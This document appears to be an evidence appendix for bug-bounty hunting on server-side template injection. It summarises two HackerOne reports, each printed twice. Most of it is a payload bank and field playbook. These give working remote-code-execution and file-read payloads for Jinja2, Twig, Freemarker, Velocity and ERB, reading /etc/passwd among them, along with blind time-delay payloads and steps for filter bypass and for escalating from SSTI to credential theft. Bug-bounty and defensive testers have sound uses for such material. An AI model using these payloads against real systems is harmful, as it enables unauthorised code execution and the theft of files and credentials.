# Evidence appendix — Server-Side Template Injection

Mined from all **7 valid disclosed reports** for this class (1 paid, 14% — payment is not validity).

## Technique frequency (all valid writeups)

| Item | Count |
|---|---:|
| admin / privileged-role context | 1 |
| internal service / port / container | 1 |
| template injection (SSTI) | 1 |

## Tools mentioned

| Item | Count |
|---|---:|

## Bypass primitives

| Item | Count |
|---|---:|

## Impact language

| Item | Count |
|---|---:|
| password | 2 |
| sensitive information | 1 |
| admin | 1 |
| credential | 1 |

## Parameters observed

| Item | Count |
|---|---:|

## Recurring approach patterns

- **1×** the researcher found a local file inclusion vulnerability this could be exploited by using twig templates available on the system
  - e.g. The researcher found a Local File inclusion vulnerability, this could be exploited by using Twig templates available on the system.
- **1×** i found template injection in via the mail input
  - e.g. I found Template Injection in [ via the mail input .

## Case studies (full excerpts)

### 301406 — Unrestricted File System Access via Twig Template Injection on dev-ucrm-billing-demo.ubnt.com
Ubiquiti Inc. · no bounty (valid finding) · high · https://hackerone.com/reports/301406

The researcher found a Local File inclusion vulnerability, this could be exploited by using Twig templates available on the system. This vulnerability only have the potential to affect `dev-ucrm-billing-demo.ubnt.com`, although is limited by the restricted environment (docker) with don't allow any sensitive information leak. This vulnerability don't have any impact and don't offer any threat for regular installations of UCRM, because the attacker need admin credentials, also the environment is isolated by a docker container.

### 1265344 — Self-DoS due to template injection via email field in password reset form on access.acronis.com
Acronis · no bounty (valid finding) · none · https://hackerone.com/reports/1265344

## Summary HI acronis security team , how are you I hope everyone is OK in the other side of the screen . I found Template Injection in [ via the mail input . ## Steps To Reproduce: 1. Open [ and Enter the mail Payload : sudo_bash{{8*8}}@wearehackerone.com 2. After submite the mail , The resulte will Reflect in the page with the mail adress . ## Impact - AngularJs CCTI may lead to xss .

### 301406 — Unrestricted File System Access via Twig Template Injection on dev-ucrm-billing-demo.ubnt.com
Ubiquiti Inc. · no bounty (valid finding) · high · https://hackerone.com/reports/301406

The researcher found a Local File inclusion vulnerability, this could be exploited by using Twig templates available on the system. This vulnerability only have the potential to affect `dev-ucrm-billing-demo.ubnt.com`, although is limited by the restricted environment (docker) with don't allow any sensitive information leak. This vulnerability don't have any impact and don't offer any threat for regular installations of UCRM, because the attacker need admin credentials, also the environment is isolated by a docker container.

### 1265344 — Self-DoS due to template injection via email field in password reset form on access.acronis.com
Acronis · no bounty (valid finding) · none · https://hackerone.com/reports/1265344

## Summary HI acronis security team , how are you I hope everyone is OK in the other side of the screen . I found Template Injection in [ via the mail input . ## Steps To Reproduce: 1. Open [ and Enter the mail Payload : sudo_bash{{8*8}}@wearehackerone.com 2. After submite the mail , The resulte will Reflect in the page with the mail adress . ## Impact - AngularJs CCTI may lead to xss .

## Full curated payload bank

### Detection polyglots

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{7*7}
*{7*7}
@(7*7)
{{7*'7'}}
${7*'7'}
{{7*7}}${7*7}<%= 7*7 %>#{7*7}
${{7*7}}
{{= 7*7}}
```

### Jinja2 / Twig / Python

```text
{{config}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
{% for x in range(3) %}x{% endfor %}
```

### Freemarker / Velocity / Java

```text
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
#set($x=7*7)$x
#set($e="".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
#foreach($i in [1..3])$i#end
```

### ERB / Ruby / Rails

```text
<%= 7*7 %>
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
<%= Rugged::Repository.new('/').head.target_id %>
```

### Blind / OOB

```text
{{7*'7'}}
{{lipsum.__globals__['os'].popen('sleep 5').read()}}
${T(java.lang.Runtime).getRuntime().exec('sleep 5')}
<%= sleep(5) %>
{{range(1000000000)}}
```

## Field playbook (unedited)

### quick

- Fuzz template syntax: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`.
- Identify the engine from output and error messages.
- Escalate to file read/RCE with engine-specific payloads.
- Check email templates, PDF/report generators, and theme editors.

### payloads

- Jinja2 -> `{{config}}` `{{cycler.__init__.__globals__.os.popen('id').read()}}`
- Twig -> `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}`
- Freemarker -> `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- ERB -> `<%= system('id') %>`

### bypass

- Bypass filters with string concatenation, `attr`, `|join`, and hex escapes.
- Use sandbox escapes for the specific engine/version.
- Blind SSTI via time delays or OOB.

### surface

- template
- name
- message
- email
- subject
- preview
- report
- theme

### tools

- tplmap
- SSTImap
- Burp
- interactsh

### chain

- SSTI -> RCE.
- SSTI -> file read -> creds.

## Corpus search commands

```sh
python3 ~/.local/share/hackerone-reports/h1.py stats --class ssti
python3 ~/.local/share/hackerone-reports/h1.py search "<feature or param>" --class ssti --limit 10
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```
